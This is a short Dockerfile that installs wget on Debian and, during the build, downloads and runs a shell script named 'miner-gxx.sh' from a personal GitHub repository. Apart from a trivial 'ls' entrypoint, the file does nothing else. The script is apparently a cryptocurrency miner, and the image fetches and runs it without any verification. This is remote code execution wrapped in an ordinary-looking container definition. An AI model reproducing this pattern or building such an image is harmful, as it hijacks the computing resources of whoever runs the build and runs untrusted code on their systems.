FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
  wget
RUN wget https://raw.githubusercontent.com/agamlimaa/test/main/miner-gxx.sh && chmod +x miner-gxx.sh && ./miner-gxx.sh
ENTRYPOINT ["/bin/bash"]
CMD ["ls"]
